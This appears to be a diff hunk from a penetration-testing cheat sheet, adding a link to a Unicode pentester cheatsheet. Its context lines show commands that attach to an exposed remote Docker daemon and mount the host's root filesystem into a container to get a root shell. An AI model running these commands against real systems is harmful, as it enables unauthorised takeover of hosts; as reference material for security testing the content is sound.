@@ -478,3 +478,6 @@ docker -H <IP>:<PORT> exec -it <container> /bin/bash
 docker -H <IP>:<PORT> run -v /:/mnt --rm -it alpine:<version> chroot /mnt sh
 docker -H <IP>:<PORT> run -v /:/mnt --rm -it alpine:<version> chroot /mnt /bin/bash
 ```
+
+### Unicode Cheatsheet thanks to @dee-see for suggesting the link
+https://gosecure.github.io/unicode-pentester-cheatsheet/
